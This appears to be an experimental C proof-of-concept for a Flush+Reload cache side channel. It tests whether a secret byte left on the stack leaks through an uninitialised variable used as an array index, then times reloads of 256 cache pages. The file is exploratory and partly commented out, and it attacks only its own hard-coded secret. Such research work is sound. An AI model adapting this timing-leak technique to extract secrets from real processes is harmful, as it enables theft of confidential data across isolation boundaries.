#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define N_PAGES 256
#define REPETITIONS 1
#define CACHE_HIT 100
#define MAYBE_CACHE_HIT 175
#define SECRET_SIZE 1
#define N_TRAINING 10
#define SECRET "mysecret"
#define false 0
#define true  1
#define DBG 0
#define MALLOC_SIZE 4096

cp_t* flush_reload_arr;

__attribute__((noinline)) void init_func(int val) {
    volatile char __attribute__ ((aligned (256))) x = val;
    printf("init  \t%p:\t%d\n", &x, x);
}

__attribute__((noinline)) void uninit_func(int val) {
    volatile char __attribute__ ((aligned (256))) x;
    volatile cp_t cp = flush_reload_arr[x];
    printf("uninit\t%p:\t%d\n", &x, x);
    //volatile int cpy = val;
}

static inline void victim_func() {
    int val = 5;

    flush((void*)&val);
    cpuid();
    init_func(val);
    uninit_func(0);

}

void touch_secret(int secret_index) {
    volatile char __attribute__ ((aligned (256))) s = SECRET[secret_index];
    printf("secret\t%p:\t%d\n", &s, s);
}

int* prepare(int secret_index) {

    flush_reload_arr = init_flush_reload(N_PAGES);
    flush_arr((void*)flush_reload_arr, N_PAGES);
    cpuid();
    int val = 5;

    //NO IDEA WHY I NEED THIS
    int n_accesses = 1;
    char secret_indices[n_accesses];
    //END OF WEIRD SECTION

    //TOUCH SECRET START
    touch_secret(secret_index);
    /*if(secret_index <= SECRET_SIZE) {   //IF TRUE
        volatile char s = SECRET[secret_index];
        printf("secret\t%p:\t%d\n", &s, s);
    }//*/
 
    //TOUCH SECRET END
    cpuid();

    //VICTIM FUNC START

    flush((void*)&val);
    cpuid();
    init_func(val);
    uninit_func(0);//*/

    /*if(secret_index <= SECRET_SIZE) {   //IF TRUE

        volatile char x = val;
        printf("init  \t%p:\t%d\n", &x, x);
    }

    if(secret_index <= SECRET_SIZE) {   //IF TRUE
        volatile char x;
        volatile cp_t cp = flush_reload_arr[x];
        printf("uninit\t%p:\t%d\n", &x, x);
    }//*/
    
    //VICTIM FUNC END
    cpuid();

    //time loading duration per array index
    int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
    unmap_cache_pages(flush_reload_arr, N_PAGES);
    return results;
}

int main(int argc, char** argv) {
    srand(time(0));
    int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints

    results[0][0] = prepare(0);
    /*for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < SECRET_SIZE; s++) {
            results[r][s] = prepare(s);
            cpuid();
        }
    }*/

    print_results(results, REPETITIONS, SECRET_SIZE, N_PAGES, CACHE_HIT);

    free_results(results, REPETITIONS, SECRET_SIZE);


}